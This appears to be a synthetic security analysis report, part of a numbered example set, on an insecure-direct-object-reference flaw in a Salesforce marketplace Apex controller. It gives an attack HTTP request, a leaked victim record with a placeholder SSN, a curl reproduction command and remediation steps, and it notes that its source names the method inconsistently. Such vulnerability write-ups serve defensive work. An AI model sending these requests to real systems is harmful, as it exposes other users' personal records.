# Security Analysis Report
**System:** ShopGrid Marketplace API (Salesforce-Integrated)
**Domain:** E-Commerce / Marketplace
**Example ID:** SF-0103
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `ContactController.updateContact` — system assumes client will only supply owned `contactId`; attacker reads any marketplace Contact record |

---

## Finding 1 — Insecure Design: Client-Assumed Authority on Contact Object (Pattern 3.1)

### Summary
The Apex controller `ContactController` on ShopGrid Marketplace API (`ae602cda.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Contact object. Per §5.0 Pattern 3.1, the system design incorrectly assumes the client will only supply a `contactId` it is authorized to access — no server-side ownership check is performed. Any attacker with a valid session can substitute any `contactId` to retrieve marketplace Contact records they do not own.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getContactDetails(String contactId, ...)` but the Aura descriptor in §6.0 is `c.ContactController.updateContact`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.ContactController.updateContact`
**Affected endpoint:** `POST https://ae602cda.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://ae602cda.lightning.force.com/aura
Authorization: Bearer 00DAE602CDA!ARae602cda...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DAE602CDA!ARae602cda...

message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN",
"params":{"contactId":"0012CDA","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Contact Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0012CDA", "Name": "Victim Contact Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-12-1224"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DAE602CDA!ARae602cda..."
curl -s -X POST "https://ae602cda.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN","params":{"contactId":"0012CDA","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-12-1224
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class ContactController { ... }`
2. `WHERE Id = :contactId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
